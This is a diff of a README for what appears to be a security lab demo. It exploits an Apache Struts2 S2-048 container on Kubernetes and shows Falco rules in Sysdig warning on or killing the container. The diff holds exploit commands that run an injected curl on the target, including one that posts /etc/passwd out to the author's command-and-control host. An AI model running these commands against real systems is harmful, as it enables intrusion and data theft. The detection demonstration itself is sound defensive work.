@@ -31,10 +31,6 @@ struts   LoadBalancer   10.100.144.108   12345.us-west-2.elb.amazonaws.com   808
 
 `Step 1`  
 
-First, on the cc server, start some simple web server such as: python3 webserver.py  
-
-`Step 2`  
-
 OK now we can attack, from the attacker "box" (actually just a tmux on my ubuntu box):  
 
 cd ~/apache-struts2-PoC  
@@ -50,24 +46,51 @@ HOSTNAME=struts-7d8c95bbbd-9p9pp
 JAVA_HOME=/usr/local/openjdk-8  
 GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42
 etc..  
-  
+
+
+`Step 2`  
+First, on the cc server, start some simple web server (you can find it in this repo) such as: 
+
+python3 webserver.py  
+
 `Step 3`  
 
-OK that was fun, what else can we do? Curl?  
+Now let us force our exploitable struts instance to reach out to our webserver like this:  
 
-python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080\hi_from_inside_the_container_in_our_cluster
+python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl jumpbox.brett1.com:8080/hi_from_inside_the_container_in_our_cluster'
 
-I wondered if I could modify an existing Falco rule to warn on curl GET? Yes! We can get granular enough to tell the difference between a curl POST and a curl GET that is awesome!  
+So that is an HTTP GET method. We can imagine, a workload needs to update or get some file, it may be permissable to let it do a GET, but we want to know when this happens.  
+So, I wondered if I could modify an existing Falco rule to warn on curl GET? Yes! 
+![image](https://user-images.githubusercontent.com/4404271/155773758-cf712d92-c7f1-42e9-913f-d34c5c2fd1b2.png)
+![image](https://user-images.githubusercontent.com/4404271/155773836-8430f346-1858-41a6-ac30-5f589bb930da.png)
+
+
+So, as you can see above, Falco allows us to get granular enough to tell the difference between a curl POST and a curl GET <Borat>very nice!</Borat>  
 So, this GET shows up on our little CC web server, and logs in Sysdig Events as a warning about curl, naughty, but I'll allow it, this time!  
+
+![image](https://user-images.githubusercontent.com/4404271/155774031-a30a2755-7851-4cbb-95b3-30c231ab38fd.png)
+![image](https://user-images.githubusercontent.com/4404271/155774091-c6d9dcd4-939c-43a7-a981-0128516feace.png)
+
+Here you can see Sysdig agent running in our EKS cluster warns on curl GET, but allows it:  
+![image](https://user-images.githubusercontent.com/4404271/155774256-163a9e44-3f0f-41b4-bc9c-3b37e4ef7039.png)
 
 `Step 4`  
 
-OK now with our confidence sky high, through the roof, let's post the whole dang passwd file to our CC server here we go:  
+OK now with our confidence sky high, through the roof, let's do a curl POST to send the passwd file to our CC server here we go:  
+(But first, we must turn off our Sysdig policy to block POST or else we will never see it work)  
+![image](https://user-images.githubusercontent.com/4404271/155774448-99285ef4-027f-43a8-b4bc-8712f9540372.png)
 
-python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080
+python exploitS2-048-cmd.py 12345.us-west-2.elb.amazonaws.com:8080 'curl -d @/etc/passwd jumpbox.brett1.com:8080'
 
 And believe me, that works! We see the passwd file appearing in our CC server.  
-But we want to block it, easy enough, we simply enable a policy with a Falco rule to kill the container iif there is a curl POST  
+![image](https://user-images.githubusercontent.com/4404271/155774611-879cc683-20db-4454-93df-2dab0de3eaab.png)
+![image](https://user-images.githubusercontent.com/4404271/155774632-a9f44814-7eb7-4e11-87ed-407cdc604266.png)
+
+OK this is beyond the pale, we cannot allow this.  
+So we simply toggle our curl POST policy to ON, this has the Falco rule to fire iif there is a curl POST,  
+and has an action to kill the container:  
+![image](https://user-images.githubusercontent.com/4404271/155774866-38990415-0101-43f1-a6ab-8090bfd2f1fb.png)
+
 And it works! The container is killed so quickly, the passwd never shows up on the CC server (I know, I tested it probably a hundred times)  
 
 `Step 5`  
